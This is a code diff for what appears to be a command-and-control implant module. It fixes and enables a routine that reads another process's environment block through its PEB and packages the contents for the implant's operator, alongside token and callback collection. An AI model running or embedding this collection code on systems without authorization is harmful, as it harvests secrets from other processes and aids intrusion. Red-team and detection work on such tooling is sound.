@@ -615,36 +615,42 @@ auto get_tokens(
     CloseHandle( token_handle );
 }
 
-auto get_env( //not working yet
+auto get_env(
     _In_ HANDLE process_handle
 ) -> void {
-    PROCESS_EXTENDED_BASIC_INFORMATION basic_info  = { 0 };
-    NTSTATUS status = NtQueryInformationProcess( process_handle, ProcessBasicInformation, &basic_info, sizeof(basic_info), nullptr );
+    PROCESS_BASIC_INFORMATION basic_info = { 0 };
+    NTSTATUS status = NtQueryInformationProcess( process_handle, ProcessBasicInformation, &basic_info, sizeof( basic_info ), nullptr );
 
-    if ( ! nt_success( status ) || ! basic_info.PebBaseAddress ) {
-        return;
-    }
+    if ( ! nt_success( status ) ) {return;}
+
+    if ( ! basic_info.PebBaseAddress ) {return;}
 
     PEB peb = { 0 };
-    ReadProcessMemory( process_handle, basic_info.PebBaseAddress, &peb, sizeof(peb), nullptr );
+    if ( ! ReadProcessMemory( process_handle, basic_info.PebBaseAddress, &peb, sizeof( peb ), nullptr ) ) {return;}
 
-    RTL_USER_PROCESS_PARAMETERS process_parameters = { 0 };
-    ReadProcessMemory( process_handle, peb.ProcessParameters, &process_parameters, sizeof(process_parameters), nullptr );
+    if ( ! peb.ProcessParameters ) {return;}
 
-    auto process_environment = ( PBYTE ) malloc ( process_parameters.EnvironmentSize );
-    if ( ! process_environment ){
-        return;
-    }
+    RTL_USER_PROCESS_PARAMETERS params = { 0 };
+    if ( ! ReadProcessMemory( process_handle, peb.ProcessParameters, &params, sizeof( params ), nullptr ) ) {return;}
 
-    if ( ! ReadProcessMemory( process_handle, process_parameters.Environment, &process_environment, sizeof(process_parameters.EnvironmentSize), nullptr ) ){
-        free( process_environment );
+    if ( ! params.Environment || params.EnvironmentSize == 0 ) {return;}
+
+    if ( params.EnvironmentSize > 0x100000 ) {return;}
+
+    auto env_buf = ( PBYTE ) malloc( params.EnvironmentSize );
+    if ( ! env_buf ) {return;}
+
+
+    SIZE_T bytes_read = 0;
+    if ( ! ReadProcessMemory( process_handle, params.Environment, env_buf, params.EnvironmentSize, &bytes_read ) ) {
+        free( env_buf );
         return;
     }
 
     BeaconPkgInt32( SECTION_ENV );
-    BeaconPkgBytes( process_environment, process_parameters.EnvironmentSize );
+    BeaconPkgBytes( env_buf, params.EnvironmentSize );
 
-    free( process_environment );
+    free( env_buf );
 }
 
 auto get_instcallbacks(
@@ -731,10 +737,9 @@ extern "C" auto go( char* args, int argc ) -> void {
         get_tokens( process_handle );
     }
 
-    // not working yet
-    //if ( section_flags & FLAG_ENV ) {
-    //    get_env( process_handle );
-    //}
+    if ( section_flags & FLAG_ENV ) {
+        get_env( process_handle );
+    }
     
     BeaconPkgInt32( SECTION_END );
 
